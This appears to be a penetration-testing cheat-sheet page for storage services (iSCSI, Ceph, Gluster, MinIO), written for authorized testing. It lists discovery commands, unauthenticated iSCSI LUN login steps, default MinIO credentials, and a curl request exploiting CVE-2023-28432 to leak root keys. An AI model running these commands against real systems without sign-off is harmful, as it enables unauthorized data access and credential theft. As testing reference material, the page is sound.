---
service: storage
title: Storage Fabric / Object Store (iSCSI / Ceph / Gluster / MinIO)
ports: 3260, 7480, 6789, 24007, 9000
aliases: iscsi, ceph, radosgw, gluster, minio
---

# Storage fabric — quick wins

**When you see it:** an iSCSI target (3260), Ceph RADOSGW (7480) / mon (6789), Gluster (24007),
or MinIO (9000) endpoint — storage backends that expose block/object data. Unauth iSCSI lets
you attach LUNs; MinIO has a config-disclosure CVE and default `minioadmin:minioadmin`. aranum
does read-side discovery only — no mounts, downloads, or attaches.

> Authorized testing only. Triage is read-only. Attaching an iSCSI LUN, downloading objects,
> or mounting a volume (marked ✏️) touches live data — get sign-off; attaching a LUN in use can
> corrupt a filesystem.

## Triage (read-only)
```sh
nmap -sV -p 3260 --script iscsi-info H              # iSCSI targets + auth requirement
curl -s http://H:7480/                              # RADOSGW (S3/Swift) — anonymous root
curl -s http://H:9000/minio/health/live             # MinIO liveness
nc -nv -w 4 H 24007                                  # Gluster daemon reachable
```

## Quick wins

### iSCSI — target discovery (and LUN attach) ✏️
```sh
nmap -sV -p 3260 --script iscsi-info H              # read-only: lists IQNs + auth
# attach (WRITES to your initiator; do NOT mount a LUN already in use):
iscsiadm -m discovery -t st -p H:3260
iscsiadm -m node -T IQN -p H:3260 --login
```
*Why:* `iscsi-info` (read-only) lists exported targets and whether CHAP is required. An
unauth target can be logged into and appears as a local block device — full read of the volume
(often VM disks / DB storage). Attaching is ✏️ and risky if the LUN is mounted elsewhere.

### MinIO — config disclosure & default creds ✏️
```sh
# CVE-2023-28432: unauth POST leaks env vars incl MINIO_ROOT_USER/PASSWORD
curl -s -X POST "http://H:9000/minio/bootstrap/v1/verify"
# default creds:
mc alias set t http://H:9000 minioadmin minioadmin && mc ls t
```
*Why:* CVE-2023-28432 returns the server's environment — including the root access/secret keys
— to an unauthenticated request; `minioadmin:minioadmin` is the install default. Either yields
full object-store access.

### RADOSGW / Ceph anonymous buckets
```sh
curl -s http://H:7480/                              # S3 ListAllMyBuckets if anon-readable
curl -s http://H:7480/BUCKET/                       # public bucket listing
```
*Why:* Ceph RADOSGW speaks the S3 API; misconfigured buckets with public ACLs list and serve
objects to anonymous requests — the object-store equivalent of an open S3 bucket.

### Gluster volume info
```sh
gluster --remote-host=H volume info all             # if management is reachable
```
*Why:* discloses volume names, brick paths, and node topology — recon for which volumes hold
data and which nodes to target next.

## aranum helpers
- `aranumtoolkit/network/enum-storage.sh` — dispatcher (iSCSI 3260 `iscsi-info`, Ceph/RADOSGW, Gluster, MinIO health; read-side discovery only — no mounts/downloads/attaches).

## Gotchas
- Attaching an iSCSI LUN that's actively mounted by a host can corrupt the filesystem — enumerate with `iscsi-info` and stop there unless sign-off covers attach.
- MinIO 9000 collides with Portainer and others — require the `minio/health` marker before trusting the hit.
- Ceph mon (6789) speaks the Ceph messenger protocol, not HTTP — RADOSGW (7480/80) is the S3 face for object access.
- MinIO patched CVE-2023-28432 in RELEASE.2023-03-20 — version-gate; but default creds persist regardless of version.

## Sources
- CVE-2023-28432 (MinIO) advisory; nmap `iscsi-info` NSE; Ceph RADOSGW S3 docs; HackTricks `3260-pentesting-iscsi` / MinIO notes; aranum `enum-storage.sh`.
